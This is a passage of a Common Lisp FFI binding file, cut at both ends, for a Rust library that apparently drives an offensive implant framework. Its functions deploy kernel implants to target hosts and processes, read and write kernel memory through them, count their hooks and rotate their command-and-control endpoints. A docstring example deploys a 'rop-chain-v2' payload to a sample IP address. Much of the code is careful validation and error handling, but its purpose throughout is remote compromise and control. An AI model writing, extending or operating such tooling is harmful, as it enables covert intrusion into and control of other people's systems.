            (setf *ffi-stub-active-without-consent-p* nil)
            (setf *ffi-stub-confirmed-p* nil)
            (setf *ffi-last-error* nil)
            (when verbose
              (format *trace-output* "[rust-ffi-init] Loaded: ~A~%" path)
              (format *trace-output* "[rust-ffi-init] FFI bridge ready.~%"))
            t)
        (error (e)
          (setf *rust-library-handle* nil)
          (setf *kernel-rust-ffi-available-p* nil)
          ;; Activate stub confirmation-required mode
          (setf *ffi-stub-active-without-consent-p* t)
          (setf *ffi-stub-confirmed-p* nil)
          ;; Publish gossip alert about stub fallback
          (when (find-package :gossip)
            (let ((gossip-fn (find-symbol "PUBLISH-ALERT" :gossip)))
              (when (fboundp gossip-fn)
                (funcall gossip-fn
                         `(:event :ffi-stub-fallback
                           :module :rust-ffi
                           :severity :high
                           :message "liblispmind_core.so not loaded — kernel ops are NO-OPs"
                           :library-path ,path
                           :error ,(format nil "~A" e))))))
          (setf *ffi-last-error* (list :code -1
                                       :description (if *ffi-production-mode-p*
                                                        "library initialization failed"
                                                        (format nil "Failed to load ~A: ~A" path e))
                                       :function 'rust-ffi-init
                                       :timestamp (get-universal-time)))
          (when verbose
            (format *trace-output* "[rust-ffi-init] ERROR: ~A~%" e)
            (format *trace-output* "[rust-ffi-init] WARNING: Entering stub mode — ~
                                    operator confirmation required.~%"))
          nil)))))

(defun rust-ffi-shutdown ()
  "Unload the Rust shared library and reset all FFI state.

   Parameters: none

   Returns:
     T if a library was unloaded, NIL if nothing was loaded.

   Side effects:
     - Unloads liblispmind_core.so via sb-alien:unload-shared-object
     - Sets *RUST-LIBRARY-HANDLE* to NIL
     - Sets *KERNEL-RUST-FFI-AVAILABLE-P* to NIL
     - Does NOT clear *FFI-LAST-ERROR* (preserved for diagnostics)

   Safety:
     - Thread-safe (acquires *FFI-LOCK*)
     - Safe to call multiple times (idempotent)
     - All subsequent FFI calls will use stub fallbacks

   Example:
     (rust-ffi-shutdown)
     (rust-ffi-available-p)  ;; => NIL"
  (with-ffi-lock
    (if *rust-library-handle*
        (progn
          (handler-case
              (sb-alien:unload-shared-object *rust-library-handle*)
            (error (e)
              (warn "Error unloading Rust library: ~A" e)))
          (setf *rust-library-handle* nil)
          (setf *kernel-rust-ffi-available-p* nil)
          t)
        nil)))

(defun rust-ffi-reload (&key (library-path *rust-library-path*) verbose)
  "Atomically reload the Rust shared library.

   Parameters:
     :library-path — Override path.  Uses *RUST-LIBRARY-PATH* or search
                     if not provided.
     :verbose      — When T, print status messages.

   Returns:
     T on successful reload, NIL on failure.

   Side effects:
     - Calls RUST-FFI-SHUTDOWN then RUST-FFI-INIT
     - All FFI state is reset

   Safety:
     - Thread-safe — no FFI calls can occur between shutdown and init
     - On failure, stubs are available (clean state guaranteed)

   Example:
     ;; Reload after library update
     (rust-ffi-reload)

     ;; Reload from new location
     (rust-ffi-reload :library-path \"/new/path/liblispmind_core.so\")"
  (with-ffi-lock
    (when verbose
      (format *trace-output* "~&[rust-ffi-reload] Reloading FFI library...~%"))
    (rust-ffi-shutdown)
    (let ((result (rust-ffi-init :library-path library-path :verbose verbose)))
      (when verbose
        (format *trace-output* "[rust-ffi-reload] Reload ~A.~%"
                (if result "successful" "FAILED")))
      result)))

;;;; ============================================================================
;;;; SECTION 6: ALIEN TYPE DEFINITIONS
;;;; ============================================================================
;;;; SBCL sb-alien type definitions mapping C types to Lisp.
;;;; These are used by the DEFINE-ALIEN-ROUTINE bindings below.

;; C int is SBCL's signed 32-bit integer on x86_64 Linux
(define-alien-type c-int sb-alien:int)

;; C uint64_t is SBCL's unsigned 64-bit integer
(define-alien-type uint64-t sb-alien:unsigned-long-long)

;; C uint8_t is an unsigned 8-bit integer (byte)
(define-alien-type uint8-t (sb-alien:unsigned 8))

;; C size_t is platform-dependent; on x86_64 Linux it's 64-bit unsigned
(define-alien-type size-t sb-alien:unsigned-long-long)

;; C-string is handled by sb-alien:c-string (automatic conversion)
(define-alien-type c-string sb-alien:c-string)

;; Pointer types for output parameters
(define-alien-type uint64-ptr (* uint64-t))
(define-alien-type int-ptr (* c-int))
(define-alien-type uint8-ptr (* uint8-t))
(define-alien-type c-string-ptr (* sb-alien:c-string))

;; Structured result type for deploy_implant (convenience)
(define-alien-type nil
    (struct implant-result
            (implant-id uint64-t)
            (memory-offset uint64-t)))

;; Structured result type for health check
(define-alien-type nil
    (struct health-result
            (status c-int)
            (details (array sb-alien:char 256))
            (uptime-seconds uint64-t)))

;; Structured result type for implant info
(define-alien-type nil
    (struct implant-info
            (type-string (array sb-alien:char 64))
            (load-time uint64-t)
            (hook-count c-int)))

;;;; ============================================================================
;;;; SECTION 7: ALIEN ROUTINE DEFINITIONS (LOW-LEVEL C BINDINGS)
;;;; ============================================================================
;;;; These are the raw sb-alien function bindings.  They are NOT intended
;;;; to be called directly by user code — use the wrapper functions in
;;;; Section 8 instead.  These definitions establish the calling convention
;;;; between Lisp and the Rust-compiled C ABI functions.

(define-alien-routine ("deploy_implant" deploy-implant-ffi)
    sb-alien:int
  "Low-level FFI binding for deploy_implant.
   C signature: int deploy_implant(const char*, const char*, int, uint64_t*, uint64_t*)

   Deploys a kernel implant to the specified target.

   Parameters (C types):
     binary-blob-id    — c-string:   NUL-terminated UTF-8 identifier for the binary payload
     target-host       — c-string:   NUL-terminated UTF-8 hostname or IP address
     target-pid        — int:        Target process ID, 0 if kernel-only
     out-implant-id    — (* uint64): Output: unique implant identifier
     out-memory-offset — (* uint64): Output: kernel virtual memory address

   Returns (int): 0 on success, non-zero error code on failure.

   WARNING: Do not call directly. Use FFI-DEPLOY-IMPLANT wrapper instead."
  (binary-blob-id c-string)
  (target-host c-string)
  (target-pid sb-alien:int)
  (out-implant-id (* sb-alien:unsigned-long-long))
  (out-memory-offset (* sb-alien:unsigned-long-long)))

(define-alien-routine ("check_health" check-health-ffi)
    sb-alien:int
  "Low-level FFI binding for check_health.
   C signature: int check_health(uint64_t, const char*, char*, uint64_t*)

   Checks the health status of a deployed implant.

   Parameters (C types):
     implant-id        — unsigned-long-long: The implant to check
     target-host       — c-string:           Hostname or IP where implant resides
     out-details       — (* char):           Output buffer (256 bytes) for status message
     out-uptime-seconds — (* uint64):        Output: seconds since implant load

   Returns (int): 0=healthy, 1=degraded, 2=critical, <0=error.

   WARNING: Do not call directly. Use FFI-CHECK-HEALTH wrapper instead."
  (implant-id sb-alien:unsigned-long-long)
  (target-host c-string)
  (out-details sb-alien:system-area-pointer)
  (out-uptime-seconds (* sb-alien:unsigned-long-long)))

(define-alien-routine ("unload_implant" unload-implant-ffi)
    sb-alien:int
  "Low-level FFI binding for unload_implant.
   C signature: int unload_implant(uint64_t, const char*)

   Removes and unloads a kernel implant from the target system.

   Parameters (C types):
     implant-id  — unsigned-long-long: The implant to remove
     target-host — c-string:           Hostname or IP where implant resides

   Returns (int): 0 on success, non-zero on error.

   WARNING: Do not call directly. Use FFI-UNLOAD-IMPLANT wrapper instead."
  (implant-id sb-alien:unsigned-long-long)
  (target-host c-string))

(define-alien-routine ("shared_memory_read" shared-memory-read-ffi)
    sb-alien:int
  "Low-level FFI binding for shared_memory_read.
   C signature: int shared_memory_read(uint64_t, uint64_t, uint8_t*, size_t)

   Reads data from a shared memory region managed by the implant.

   Parameters (C types):
     implant-id  — unsigned-long-long: The implant managing the memory
     address     — unsigned-long-long: Kernel virtual address to read from
     out-buffer  — system-area-pointer: Output buffer for read data
     buffer-size — unsigned-long-long: Size of output buffer in bytes

   Returns (int): Bytes actually read, or negative error code.

   WARNING: Do not call directly. Use FFI-READ-MEMORY wrapper instead."
  (implant-id sb-alien:unsigned-long-long)
  (address sb-alien:unsigned-long-long)
  (out-buffer sb-alien:system-area-pointer)
  (buffer-size sb-alien:unsigned-long-long))

(define-alien-routine ("shared_memory_write" shared-memory-write-ffi)
    sb-alien:int
  "Low-level FFI binding for shared_memory_write.
   C signature: int shared_memory_write(uint64_t, uint64_t, const uint8_t*, size_t)

   Writes data to a shared memory region managed by the implant.

   Parameters (C types):
     implant-id — unsigned-long-long: The implant managing the memory
     address    — unsigned-long-long: Kernel virtual address to write to
     data       — system-area-pointer: Source data buffer
     data-len   — unsigned-long-long: Number of bytes to write

   Returns (int): Bytes actually written, or negative error code.

   WARNING: Do not call directly. Use FFI-WRITE-MEMORY wrapper instead."
  (implant-id sb-alien:unsigned-long-long)
  (address sb-alien:unsigned-long-long)
  (data sb-alien:system-area-pointer)
  (data-len sb-alien:unsigned-long-long))

(define-alien-routine ("get_implant_info" get-implant-info-ffi)
    sb-alien:int
  "Low-level FFI binding for get_implant_info.
   C signature: int get_implant_info(uint64_t, char*, uint64_t*, int*)

   Retrieves metadata about a deployed implant.

   Parameters (C types):
     implant-id    — unsigned-long-long: The implant to query
     out-type      — system-area-pointer: Output buffer (64 bytes) for type string
     out-load-time — (* uint64):         Output: Unix timestamp of load
     out-hook-count — (* int):           Output: number of active hooks

   Returns (int): 0 on success, non-zero on error.

   WARNING: Do not call directly. Use FFI-GET-IMPLANT-INFO wrapper instead."
  (implant-id sb-alien:unsigned-long-long)
  (out-type sb-alien:system-area-pointer)
  (out-load-time (* sb-alien:unsigned-long-long))
  (out-hook-count (* sb-alien:int)))

(define-alien-routine ("rotate_transport" rotate-transport-ffi)
    sb-alien:int
  "Low-level FFI binding for rotate_transport.
   C signature: int rotate_transport(uint64_t, const char*)

   Rotates the C2 transport endpoint for an implant.

   Parameters (C types):
     implant-id   — unsigned-long-long: The implant to reconfigure
     new-endpoint — c-string:           New C2 endpoint URL or address

   Returns (int): 0 on success, non-zero on error.

   WARNING: Do not call directly. Use FFI-ROTATE-TRANSPORT wrapper instead."
  (implant-id sb-alien:unsigned-long-long)
  (new-endpoint c-string))

;;;; ============================================================================
;;;; SECTION 8: INPUT VALIDATION HELPERS
;;;; ============================================================================
;;;; Functions to validate arguments before passing to C code.
;;;; These catch errors on the Lisp side and prevent corrupt data
;;;; from reaching the foreign functions.

(defun validate-string-argument (value name max-length)
  "Validate that VALUE is a suitable string argument for FFI.

   Parameters:
     VALUE      — The value to validate.
     NAME       — Symbol naming the argument (for error messages).
     MAX-LENGTH — Maximum allowed length in characters.

   Returns:
     The validated string.

   Signals:
     FFI-INVALID-ARGUMENT if VALUE is not a string, is empty, contains
     embedded NUL bytes, or exceeds MAX-LENGTH.

   Examples:
     (validate-string-argument \"valid-host\" 'target-host 256)
       => \"valid-host\"

     (validate-string-argument 123 'target-host 256)
       ;; signals FFI-INVALID-ARGUMENT

     (validate-string-argument \"x\" 'id 4096)
       ;; signals FFI-INVALID-ARGUMENT (too short — must be meaningful)"
  (unless (stringp value)
    (error 'ffi-invalid-argument
           :function 'validate-string-argument
           :argument-name name
           :argument-value value
           :description (format nil "~A must be a string, got ~A"
                                name (type-of value))))
  (let ((len (length value)))
    (when (zerop len)
      (error 'ffi-invalid-argument
             :function 'validate-string-argument
             :argument-name name
             :argument-value value
             :description (format nil "~A cannot be an empty string" name)))
    (when (> len max-length)
      (error 'ffi-invalid-argument
             :function 'validate-string-argument
             :argument-name name
             :argument-value value
             :description (format nil "~A exceeds maximum length ~D (got ~D)"
                                  name max-length len)))
    ;; Check for embedded NUL bytes (would truncate C string)
    (dotimes (i len)
      (when (char= (char value i) #\Null)
        (error 'ffi-invalid-argument
               :function 'validate-string-argument
               :argument-name name
               :argument-value value
               :description (format nil "~A contains embedded NUL byte at position ~D"
                                    name i)))))
  value)

(defun validate-implant-id (id)
  "Validate that ID is a valid implant identifier.

   Parameters:
     ID — The value to validate. Must be a positive integer.

   Returns:
     The validated integer.

   Signals:
     FFI-INVALID-ARGUMENT if ID is not a positive integer.

   Examples:
     (validate-implant-id 1234567890)  => 1234567890
     (validate-implant-id 0)           ;; signals FFI-INVALID-ARGUMENT
     (validate-implant-id -1)          ;; signals FFI-INVALID-ARGUMENT
     (validate-implant-id \"bad\")      ;; signals FFI-INVALID-ARGUMENT"
  (unless (and (integerp id) (plusp id))
    (error 'ffi-invalid-argument
           :function 'validate-implant-id
           :argument-name 'implant-id
           :argument-value id
           :description (format nil "implant-id must be a positive integer, got ~S (~A)"
                                id (type-of id))))
  id)

(defun validate-buffer-size (size &optional (max-size *ffi-max-buffer-size*))
  "Validate that SIZE is a valid buffer size for memory operations.

   Parameters:
     SIZE     — Requested buffer size in bytes. Must be a positive integer.
     MAX-SIZE — Maximum allowed size (defaults to *FFI-MAX-BUFFER-SIZE*).

   Returns:
     The validated size.

   Signals:
     FFI-INVALID-ARGUMENT if SIZE is invalid.
     FFI-BUFFER-OVERFLOW if SIZE exceeds MAX-SIZE.

   Examples:
     (validate-buffer-size 4096)              => 4096
     (validate-buffer-size (* 16 1024 1024))  => 16777216
     (validate-buffer-size 0)                 ;; signals FFI-INVALID-ARGUMENT
     (validate-buffer-size (* 32 1024 1024))  ;; signals FFI-BUFFER-OVERFLOW"
  (unless (and (integerp size) (plusp size))
    (error 'ffi-invalid-argument
           :function 'validate-buffer-size
           :argument-name 'size
           :argument-value size
           :description (format nil "Buffer size must be a positive integer, got ~S (~A)"
                                size (type-of size))))
  (when (> size max-size)
    (error 'ffi-buffer-overflow
           :function 'validate-buffer-size
           :requested-size size
           :maximum-size max-size
           :description (format nil "Buffer size ~D exceeds maximum ~D"
                                size max-size)))
  size)

(defun validate-byte-vector (data)
  "Validate that DATA is a valid byte vector for memory write operations.

   Parameters:
     DATA — The value to validate. Must be a (vector (unsigned-byte 8)).

   Returns:
     The validated vector.

   Signals:
     FFI-INVALID-ARGUMENT if DATA is not a byte vector or is empty.

   Examples:
     (validate-byte-vector #(1 2 3 255))   => #(1 2 3 255)
     (validate-byte-vector #())            ;; signals FFI-INVALID-ARGUMENT
     (validate-byte-vector \"not bytes\")   ;; signals FFI-INVALID-ARGUMENT"
  (unless (and (vectorp data)
               (eq (array-element-type data) '(unsigned-byte 8))
               (> (length data) 0))
    (error 'ffi-invalid-argument
           :function 'validate-byte-vector
           :argument-name 'data
           :argument-value data
           :description (format nil "Data must be a non-empty (vector (unsigned-byte 8)), got ~A"
                                (type-of data))))
  data)

;;;; ============================================================================
;;;; SECTION 8.5: COMPREHENSIVE BUFFER VALIDATION FOR FFI
;;;; ============================================================================
;;;; Validates all buffer and string arguments before every C call.
;;;; This is a cross-cutting security check called at the start of every
;;;; wrapper function.

(defun validate-buffer-for-ffi (buffer-or-size &key string-p max-size max-length)
  "Comprehensive validation for FFI buffer and string arguments.

   Parameters:
     BUFFER-OR-SIZE — Either a buffer (vector) or a size (integer) to validate.
     :STRING-P       — When T, validate as a string argument.
     :MAX-SIZE       — Maximum buffer size (defaults to *FFI-MAX-BUFFER-SIZE*).
     :MAX-LENGTH     — Maximum string length (defaults to *FFI-MAX-STRING-LENGTH*).

   Returns:
     The validated size/length on success.

   Signals:
     FFI-INVALID-ARGUMENT with a GENERIC message on any validation failure.
     In production mode, the error message is sanitized.

   Validation checks:
     1. Size > 0 and < *FFI-MAX-BUFFER-SIZE* (default 16MB)
     2. String arguments are non-empty and < *FFI-MAX-STRING-LENGTH* (default 4096)
     3. Strings contain no embedded NUL bytes
     4. Buffer (if a vector) is non-empty

   Security:
     - This function is called at the start of EVERY wrapper function.
     - Error messages are generic to prevent information leakage.
     - Never exposes: buffer addresses, memory sizes, or internal details.

   Example:
     (validate-buffer-for-ffi 4096)                          ; => 4096
     (validate-buffer-for-ffi \"target-host\" :string-p t)    ; => 11
     (validate-buffer-for-ffi 0)                             ; signals error
     (validate-buffer-for-ffi \"\" :string-p t)              ; signals error"
  (let ((effective-max-size (or max-size *ffi-max-buffer-size*))
        (effective-max-length (or max-length *ffi-max-string-length*)))
    (cond
      ;; String validation branch
      (string-p
       (unless (stringp buffer-or-size)
         (error 'ffi-invalid-argument
                :function 'validate-buffer-for-ffi
                :argument-name 'buffer-or-size
                :argument-value buffer-or-size
                :description (if *ffi-production-mode-p*
                                 "invalid argument"
                                 "expected a string argument")))
       (let ((len (length buffer-or-size)))
         (when (zerop len)
           (error 'ffi-invalid-argument
                  :function 'validate-buffer-for-ffi
                  :argument-name 'buffer-or-size
                  :argument-value buffer-or-size
                  :description "argument cannot be empty"))
         (when (> len effective-max-length)
           (error 'ffi-invalid-argument
                  :function 'validate-buffer-for-ffi
                  :argument-name 'buffer-or-size
                  :argument-value buffer-or-size
                  :description (if *ffi-production-mode-p*
                                   "argument exceeds allowed length"
                                   (format nil "argument exceeds maximum length ~D"
                                           effective-max-length))))
         ;; Check for embedded NUL bytes
         (dotimes (i len)
           (when (char= (char buffer-or-size i) #\Null)
             (error 'ffi-invalid-argument
                    :function 'validate-buffer-for-ffi
                    :argument-name 'buffer-or-size
                    :argument-value buffer-or-size
                    :description "argument contains invalid characters")))
         len))
      ;; Integer (size) validation branch
      ((integerp buffer-or-size)
       (when (<= buffer-or-size 0)
         (error 'ffi-invalid-argument
                :function 'validate-buffer-for-ffi
                :argument-name 'buffer-or-size
                :argument-value buffer-or-size
                :description "invalid buffer size"))
       (when (> buffer-or-size effective-max-size)
         (error 'ffi-buffer-overflow
                :function 'validate-buffer-for-ffi
                :requested-size buffer-or-size
                :maximum-size effective-max-size
                :description (if *ffi-production-mode-p*
                                 "resource limit exceeded"
                                 (format nil "buffer size ~D exceeds maximum ~D"
                                         buffer-or-size effective-max-size))))
       buffer-or-size)
      ;; Vector validation branch
      ((vectorp buffer-or-size)
       (let ((len (length buffer-or-size)))
         (when (zerop len)
           (error 'ffi-invalid-argument
                  :function 'validate-buffer-for-ffi
                  :argument-name 'buffer-or-size
                  :argument-value buffer-or-size
                  :description "buffer cannot be empty"))
         (when (> len effective-max-size)
           (error 'ffi-buffer-overflow
                  :function 'validate-buffer-for-ffi
                  :requested-size len
                  :maximum-size effective-max-size
                  :description (if *ffi-production-mode-p*
                                   "resource limit exceeded"
                                   (format nil "buffer size ~D exceeds maximum ~D"
                                           len effective-max-size))))
         len))
      ;; Anything else is invalid
      (t
       (error 'ffi-invalid-argument
              :function 'validate-buffer-for-ffi
              :argument-name 'buffer-or-size
              :argument-value buffer-or-size
              :description (if *ffi-production-mode-p*
                               "invalid argument"
                               (format nil "unexpected type: ~A" (type-of buffer-or-size))))))))

;;;; ============================================================================
;;;; SECTION 9: FFI CALL LOGGING AND MONITORING
;;;; ============================================================================
;;;; Optional call logging for audit trails and debugging.

(defun log-ffi-call (function-name &rest args)
  "Log an FFI function call with sanitized arguments.

   Parameters:
     FUNCTION-NAME — Symbol naming the function being called.
     ARGS          — Arguments (will be prin1-to-string, truncated).

   Returns:
     NIL (side effect only).

   Side effects:
     Prints a line to *TRACE-OUTPUT* if *FFI-LOG-CALLS* is T.
     Implant IDs are logged (they're not highly sensitive) but
     memory contents and binary blobs are never logged.

   Example:
     (log-ffi-call 'ffi-deploy-implant \"blob-id\" \"192.168.1.1\" 0)"
  (when *ffi-log-calls*
    (format *trace-output* "~&[FFI-CALL ~A] ~{~S~^ ~}~%"
            function-name
            (mapcar (lambda (a)
                      (let ((s (prin1-to-string a)))
                        (if (> (length s) 80)
                            (concatenate 'string (subseq s 0 77) "...")
                            s)))
                    args))))

;;;; ============================================================================
;;;; SECTION 9.5: STUB CONFIRMATION FUNCTIONS
;;;; ============================================================================
;;;; These functions manage operator consent for stub fallback mode.
;;;; When the FFI library cannot be loaded, the system enters a "stub
;;;; confirmation required" state.  Wrapper functions will signal
;;;; FFI-STUB-NOT-CONFIRMED until the operator explicitly confirms.

(defun confirm-ffi-stub-operation ()
  "Interactively confirm that stub fallback operation is acceptable.

   Returns:
     T after confirmation is recorded.

   Side effects:
     - Sets *FFI-STUB-CONFIRMED-P* to T
     - Logs confirmation to *TRACE-OUTPUT*
     - Publishes a gossip alert indicating stub mode is confirmed

   Security:
     This requires an explicit operator call, ensuring that silent
     stub fallbacks are never mistaken for real operations.

   Example:
     (handler-case (ffi-deploy-implant \"blob\" \"host\" 0)
       (ffi-stub-not-confirmed ()
         (confirm-ffi-stub-operation)
         (ffi-deploy-implant \"blob\" \"host\" 0)))"
  (setf *ffi-stub-confirmed-p* t)
  ;; Publish gossip alert
  (when (find-package :gossip)
    (let ((gossip-fn (find-symbol "PUBLISH-ALERT" :gossip)))
      (when (fboundp gossip-fn)
        (funcall gossip-fn
                 '(:event :ffi-stub-confirmed
                   :module :rust-ffi
                   :severity :info
                   :message "Operator confirmed stub mode — kernel ops are simulated")))))
  (format *trace-output*
          "~&[confirm-ffi-stub-operation] Operator confirmed stub mode — ~
           kernel ops are simulated.~%")
  t)

(defun ffi-stub-force-confirm ()
  "Force confirmation of stub fallback mode for automated deployments.

   Returns:
     T after confirmation is recorded.

   Side effects:
     - Sets *FFI-STUB-ACTIVE-WITHOUT-CONSENT-P* to NIL
     - Sets *FFI-STUB-CONFIRMED-P* to T
     - Logs a warning about automated confirmation

   Security WARNING:
     This bypasses the interactive confirmation requirement.  Only use
     in fully automated deployments where operator interaction is not
     possible.  The caller is responsible for ensuring that stub mode
     is an acceptable operational state.

   Example:
     ;; In automated deployment script:
     (unless (rust-ffi-init)
       (ffi-stub-force-confirm))"
  (setf *ffi-stub-active-without-consent-p* nil)
  (setf *ffi-stub-confirmed-p* t)
  (when *ffi-verbose*
    (format *trace-output*
            "~&[ffi-stub-force-confirm] AUTOMATED confirmation of stub mode.~%"))
  t)

;;;; ============================================================================
;;;; SECTION 10: HIGH-LEVEL WRAPPER FUNCTIONS
;;;; ============================================================================
;;;; These are the functions that kernel-orchestrator and other modules call.
;;;; Each wrapper validates inputs, acquires the lock, calls the C function,
;;;; and returns a structured Lisp result.  When FFI is unavailable, they
;;;; delegate to stub functions (defined in Section 12).

(defun ffi-deploy-implant (binary-blob-id target-host &optional (target-pid 0))
  "Deploy a kernel implant via the Rust FFI.

   Parameters:
     binary-blob-id — String: Identifier for the binary payload to deploy.
                      Must be non-empty, <= 4096 chars, no embedded NULs.
     target-host    — String: Hostname or IP address of the target system.
                      Must be non-empty, <= 4096 chars, no embedded NULs.
     target-pid     — Integer: Target process ID for process-level injection.
                      Use 0 (default) for kernel-only deployment.

   Returns:
     A property list describing the result:
       On success: (:success t :implant-id <uint64> :memory-offset <uint64>)
       On failure: (:success nil :error-code <int> :error-description <string>)
       If FFI unavailable: (:success nil :stub t :reason \"FFI unavailable\")

   Signals:
     FFI-INVALID-ARGUMENT — If inputs fail validation.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-deploy-implant \"rop-chain-v2\" \"192.168.1.100\" 0)
     ;; => (:success t :implant-id 1743298456321 :memory-offset #x7FFE8000)

     (ffi-deploy-implant \"invalid\" \"bad-host\" 99999)
     ;; => (:success nil :error-code -5 :error-description \"...\")"
  ;; Validate inputs
  (validate-buffer-for-ffi binary-blob-id :string-p t)
  (validate-buffer-for-ffi target-host :string-p t)
  (unless (integerp target-pid)
    (error 'ffi-invalid-argument
           :function 'ffi-deploy-implant
           :argument-name 'target-pid
           :argument-value target-pid
           :description "target-pid must be an integer"))
  ;; Check FFI availability
  (unless (rust-ffi-available-p)
    ;; Stub mode: require confirmation before executing stub
    (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
      (error 'ffi-stub-not-confirmed
             :function 'ffi-deploy-implant
             :stub-function 'ffi-deploy-implant
             :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
    (return-from ffi-deploy-implant
      (stub-ffi-deploy-implant binary-blob-id target-host target-pid)))
  ;; Log the call
  (log-ffi-call 'ffi-deploy-implant binary-blob-id target-host target-pid)
  ;; Execute the FFI call with pinned strings for GC safety
  (with-ffi-lock
    (with-alien ((out-id sb-alien:unsigned-long-long)
                 (out-offset sb-alien:unsigned-long-long))
      (setf (deref out-id) 0)
      (setf (deref out-offset) 0)
      (with-pinned-lisp-string (blob-ptr binary-blob-id)
        (with-pinned-lisp-string (host-ptr target-host)
          (let ((result (deploy-implant-ffi blob-ptr
                                            host-ptr
                                            target-pid
                                            (addr out-id)
                                            (addr out-offset))))
            (if (zerop result)
                ;; Success
                (progn
                  (setf *ffi-last-error* nil)
                  (list :success t
                        :implant-id (deref out-id)
                        :memory-offset (deref out-offset)))
                ;; Failure — sanitize error in production mode
                (let* ((sanitized (sanitize-ffi-error result))
                       (error-desc (if *ffi-production-mode-p*
                                       (getf sanitized :message)
                                       (ffi-error-code→string result))))
                  (setf *ffi-last-error* (list :code result
                                               :description error-desc
                                               :function 'ffi-deploy-implant
                                               :timestamp (get-universal-time)))
                  (when *ffi-verbose*
                    (format *trace-output* "~&[ffi-deploy-implant] FAILED: ~A (code ~D)~%"
                            error-desc result))
                  (list :success nil
                        :error-code result
                        :error-description error-desc))))))))

(defun ffi-check-health (implant-id target-host)
  "Check the health of a deployed kernel implant.

   Parameters:
     implant-id  — Positive integer: The unique ID of the implant to check.
     target-host — String: Hostname or IP where the implant resides.

   Returns:
     A property list describing health status:
       On success: (:status :healthy|:degraded|:critical
                    :details \"<description>\" :uptime <seconds>)
       On error:   (:status :error :error-code <int> :error-description \"<msg>\")
       If FFI unavailable: (:status :unknown :stub t :reason \"FFI unavailable\")

   The :status keyword mapping from C return codes:
     0  → :healthy
     1  → :degraded
     2  → :critical
     <0 → :error

   Signals:
     FFI-INVALID-ARGUMENT — If inputs fail validation.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-check-health 1743298456321 \"192.168.1.100\")
     ;; => (:status :healthy :details \"All systems nominal\" :uptime 3600)

     (ffi-check-health 99999 \"192.168.1.100\")
     ;; => (:status :error :error-code -13 :error-description \"Implant not found\")"
  ;; Validate inputs
  (validate-implant-id implant-id)
  (validate-buffer-for-ffi target-host :string-p t)
  ;; Check FFI availability
  (unless (rust-ffi-available-p)
    ;; Stub mode: require confirmation before executing stub
    (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
      (error 'ffi-stub-not-confirmed
             :function 'ffi-check-health
             :stub-function 'ffi-check-health
             :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
    (return-from ffi-check-health
      (stub-ffi-check-health implant-id target-host)))
  ;; Log the call
  (log-ffi-call 'ffi-check-health implant-id target-host)
  ;; Execute the FFI call with pinned string for GC safety
  (with-ffi-lock
    (with-alien ((out-uptime sb-alien:unsigned-long-long))
      ;; Allocate details buffer as alien array (C writes TO this buffer)
      (let* ((details-buffer (make-alien sb-alien:char *ffi-details-buffer-size*)))
        (unwind-protect
             (with-pinned-lisp-string (host-ptr target-host)
               (let ((result (check-health-ffi implant-id
                                             host-ptr
                                             (alien-sap details-buffer)
                                             (addr out-uptime))))
                 (cond
                   ;; Healthy (0)
                   ((zerop result)
                    (setf *ffi-last-error* nil)
                    (list :status :healthy
                          :details (sb-alien::c-string-to-string
                                    (alien-sap details-buffer)
                                    (sb-impl::external-format :utf-8)
                                    'character)
                          :uptime (deref out-uptime)))
                   ;; Degraded (1)
                   ((= result 1)
                    (setf *ffi-last-error* nil)
                    (list :status :degraded
                          :details (sb-alien::c-string-to-string
                                    (alien-sap details-buffer)
                                    (sb-impl::external-format :utf-8)
                                    'character)
                          :uptime (deref out-uptime)))
                   ;; Critical (2)
                   ((= result 2)
                    (setf *ffi-last-error* nil)
                    (list :status :critical
                          :details (sb-alien::c-string-to-string
                                    (alien-sap details-buffer)
                                    (sb-impl::external-format :utf-8)
                                    'character)
                          :uptime (deref out-uptime)))
                   ;; Error (< 0) — sanitize in production mode
                   (t
                    (let* ((sanitized (sanitize-ffi-error result))
                           (error-desc (if *ffi-production-mode-p*
                                           (getf sanitized :message)
                                           (ffi-error-code→string result))))
                      (setf *ffi-last-error* (list :code result
                                                   :description error-desc
                                                   :function 'ffi-check-health
                                                   :timestamp (get-universal-time)))
                      (when *ffi-verbose*
                        (format *trace-output* "~&[ffi-check-health] ERROR: ~A (code ~D)~%"
                                error-desc result))
                      (list :status :error
                            :error-code result
                            :error-description error-desc))))))
          ;; Cleanup: free the details buffer
          (free-alien details-buffer))))))

(defun ffi-unload-implant (implant-id target-host)
  "Unload and remove a kernel implant from the target system.

   Parameters:
     implant-id  — Positive integer: The unique ID of the implant to remove.
     target-host — String: Hostname or IP where the implant resides.

   Returns:
     T on successful unload.
     NIL on failure (with *FFI-LAST-ERROR* set).
     If FFI unavailable: returns NIL (stub behavior — no operation performed).

   Signals:
     FFI-INVALID-ARGUMENT — If inputs fail validation.
     FFI-TIMEOUT          — If the call exceeds *FFI-CALL-TIMEOUT*.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-unload-implant 1743298456321 \"192.168.1.100\")
     ;; => T

     (ffi-unload-implant 99999 \"192.168.1.100\")
     ;; => NIL (implant not found)"
  ;; Validate inputs
  (validate-implant-id implant-id)
  (validate-buffer-for-ffi target-host :string-p t)
  ;; Check FFI availability
  (unless (rust-ffi-available-p)
    ;; Stub mode: require confirmation before executing stub
    (when (and *ffi-stub-active-without-consent-p* (not *ffi-stub-confirmed-p*))
      (error 'ffi-stub-not-confirmed
             :function 'ffi-unload-implant
             :stub-function 'ffi-unload-implant
             :description "FFI stub mode not confirmed — call confirm-ffi-stub-operation first"))
    (return-from ffi-unload-implant
      (stub-ffi-unload-implant implant-id target-host)))
  ;; Log the call
  (log-ffi-call 'ffi-unload-implant implant-id target-host)
  ;; Execute the FFI call with pinned string for GC safety
  (with-ffi-lock
    (with-pinned-lisp-string (host-ptr target-host)
      (let ((result (unload-implant-ffi implant-id host-ptr)))
        (if (zerop result)
            ;; Success
            (progn
              (setf *ffi-last-error* nil)
              t)
            ;; Failure — sanitize error in production mode
            (let* ((sanitized (sanitize-ffi-error result))
                   (error-desc (if *ffi-production-mode-p*
                                   (getf sanitized :message)
